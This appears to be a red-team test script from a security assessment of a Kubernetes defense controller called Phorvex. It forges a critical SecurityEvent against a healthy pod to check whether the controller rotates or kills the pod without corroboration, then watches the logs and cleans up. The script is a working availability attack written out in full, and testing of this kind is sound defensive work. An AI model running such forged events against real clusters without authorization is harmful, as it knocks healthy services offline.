#!/usr/bin/env bash
# M6 — forged-detector run (ATTACKS.md M6/R3b).
# Hypothesis: Phorvex trusts ANY non-PhorvexController SecurityEvent source; a forged
# critical event at a HEALTHY pod drives motion (rotate) with zero corroboration.
# Oracle: brain rotates a pod we know is clean = defense-as-availability-amplifier.
set -euo pipefail
OUT=/tmp/px-m6; mkdir -p "$OUT"
NS=voice

POD=$(kubectl get pods -n "$NS" -o jsonpath='{.items[0].metadata.name}')
echo "target (healthy) pod: $POD" | tee "$OUT/target.txt"
kubectl get pod -n "$NS" "$POD" -o jsonpath='{.metadata.uid}{"\n"}' | tee "$OUT/uid-before.txt"
echo "$POD" > "$OUT/pod-name.txt"

echo "=== baseline: pod healthy, no compromise (M6 is the point: nothing is wrong) ==="
kubectl get pod -n "$NS" "$POD" -o jsonpath='{.status.phase}{"  started="}{.status.startTime}{"\n"}'

echo "=== firing FORGED critical SecurityEvent (source=redteam — any non-Phorvex source is trusted) ==="
kubectl apply -f - <<EOF
apiVersion: amtd.r6security.com/v1beta1
kind: SecurityEvent
metadata:
  name: m6-forged-detector
spec:
  rule:
    type: Panic
    threatLevel: critical
    source: redteam
  targets:
    - $NS/$POD
  description: "M6: FORGED detector event at a healthy pod — tests whether Phorvex corroborates before motion"
  anomalyScore: "0.99"
EOF
date -Is | tee "$OUT/fired-at.txt"

echo "=== watching for a decision on $POD (expect: rotate, hazard=1.00, on a CLEAN pod) ==="
: > "$OUT/decision-log.txt"
for i in $(seq 1 15); do
  sleep 5
  kubectl logs -n phorvex-system deploy/phorvex-phorvex --since=90s 2>/dev/null \
    | grep -i "$POD" | grep -i "rotate\|kv-reset\|quarantine" | tail -5 > "$OUT/decision-log.txt" || true
  if [ -s "$OUT/decision-log.txt" ]; then cat "$OUT/decision-log.txt"; break; fi
  echo "  ...waiting for tick ($i)"
done

echo "=== aftermath: was the healthy pod killed? ==="
kubectl get pods -n "$NS" -o wide | tee "$OUT/pods-after.txt"
NEWUID=$(kubectl get pod -n "$NS" "$POD" -o jsonpath='{.metadata.uid}' 2>/dev/null || echo "GONE")
echo "uid before: $(cat "$OUT/uid-before.txt")"
echo "uid after:  $NEWUID"
[ "$NEWUID" = "GONE" ] && echo "=> FORGED EVENT CAUSED A ROTATION (healthy pod killed)" || echo "=> pod unchanged"

echo "=== cleanup: remove the forged event ==="
kubectl delete securityevent m6-forged-detector --ignore-not-found
